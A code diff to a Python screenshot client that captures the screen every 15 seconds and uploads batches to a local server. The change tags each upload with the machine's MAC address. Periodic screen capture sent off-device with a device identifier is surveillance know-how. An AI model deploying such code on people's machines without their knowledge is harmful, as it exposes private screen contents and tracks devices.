@@ -5,10 +5,13 @@ import mss.tools
 import os
 from contextlib import ExitStack # to close screenshots properly
 from datetime import datetime, timezone # to classify screenshots by time sent
+from getmac import get_mac_address # to get mac address
 
 URL = 'http://127.0.0.1:8000'
 SCREENSHOT_INTERVAL = 15.0 # Interval between taking screenshots (in seconds).
 SEND_COUNT = 2 # How many screenshots need to be taken before sending.
+MAC = get_mac_address().replace(':', '') # store mac address
+
 screenshots = []
 # Make sure the screenshot&send count combo don't make the sending interval
 # (screenshot interval * send count) too low so you don't DDOS yourself
@@ -33,7 +36,7 @@ def send_screenshot():
             img = stack.enter_context(open(ss, 'rb')) # open the screenshot in read-only mode binary
             ss_payload["files"] = (ss, img, 'image/png') # make the payload for the screenshot containing its name, the screenshot in binary, and its MIME type and add it to the list of the payload
             i += 1 # add 1 to the counter so the screenshot keys enumerate ex. {'file1:(..),file2:(..), and so on'}
-        r = requests.post(URL, files=ss_payload) # POST (send) the screenshot
+        r = requests.post(URL, headers={'mac':MAC}, files=ss_payload) # POST (send) the screenshot
     if not 300 > r.status_code >= 200:
         pass
     else:
